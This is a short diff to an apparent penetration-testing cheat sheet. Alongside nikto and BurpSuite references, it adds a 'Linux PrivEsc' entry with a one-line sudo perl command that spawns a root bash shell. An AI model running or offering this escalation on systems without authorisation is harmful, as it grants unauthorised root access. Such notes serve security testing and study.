@@ -233,3 +233,16 @@ nikto -host=http://<domain> -maxtime=30s
 
 #### [BurpSuite](burpsuite.md)
 	Intruderd
+
+
+
+
+
+
+
+Linux PrivEsc:
+
+##### perl
+```bash
+sudo /usr/bin/perl -e 'exec("/bin/bash")'
+```
